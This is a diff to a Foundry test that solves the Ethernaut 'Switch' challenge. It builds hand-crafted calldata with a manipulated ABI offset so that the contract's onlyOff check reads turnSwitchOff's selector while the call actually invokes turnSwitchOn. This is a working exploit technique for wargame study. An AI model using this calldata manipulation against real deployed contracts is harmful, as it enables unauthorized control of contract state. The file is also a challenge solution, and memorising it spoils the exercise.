@@ -4,6 +4,9 @@ pragma solidity ^0.8.0;
 import "forge-std/Test.sol";
 import "src/openzeppelin-ethernaut/Switch.sol";
 
+// onlyOff() assumes flipSwitch() is not called with address.call() and calldata follow the usual layout:
+// selector 4 bytes, offset 32 bytes, and data length 32 bytes = 68 bytes
+// thus, we can build calldata manually and address.call() to circumvent the layout assumption
 contract SwitchTest is Test {
     Switch instance;
 
@@ -15,18 +18,24 @@ contract SwitchTest is Test {
         assertEq(instance.switchOn(), false);
 
         // 30c13ade: flipSwitch selector
-        // 0000000000000000000000000000000000000000000000000000000000000060: 3*32 bytes (hence 0x60) offset, including this offset specifier and the following two 32 bytes set
-        // 0000000000000000000000000000000000000000000000000000000000000004: make it 4 to be the usual length of the following data
-        // tho in this case, these 32 bytes can be anything as long as the next 4 bytes are the selector of turnSwitchOff as specified in onlyOff
-        // 20606e1500000000000000000000000000000000000000000000000000000000: turnSwitchOff selector
+        // 0000000000000000000000000000000000000000000000000000000000000060: customised data offset:
+        // this offset 32 bytes, the following padding 32 bytes, and turnSwitchOff.selector 4 bytes
+        // 0000000000000000000000000000000000000000000000000000000000000000: padding to fit the 68 bytes offset
+        // 20606e15: turnSwitchOff.selector; can also make this a bytes32, just update data offset to 32*3
 
-        // since we specify there's a 3*32 bytes offset, the function knows to parse the following data as its input _data
-        // 0000000000000000000000000000000000000000000000000000000000000004: data length, which is 4
-        // 76227e1200000000000000000000000000000000000000000000000000000000: turnSwitchOn selector
-        bytes memory param =
-            hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000420606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000";
+        // as the offset ends, this is where the input _data starts: (length, data)
+        // 0000000000000000000000000000000000000000000000000000000000000004: data length, 4 bytes
+        // 76227e1200000000000000000000000000000000000000000000000000000000: turnSwitchOn.selector
+        bytes memory data = abi.encodePacked(
+            Switch.flipSwitch.selector,
+            bytes32(uint256(32 * 2 + 4)),
+            bytes32(0),
+            Switch.turnSwitchOff.selector,
+            bytes32(uint256(4)),
+            Switch.turnSwitchOn.selector
+        );
 
-        address(instance).call(param);
+        address(instance).call(data);
         assertEq(instance.switchOn(), true);
     }
 }
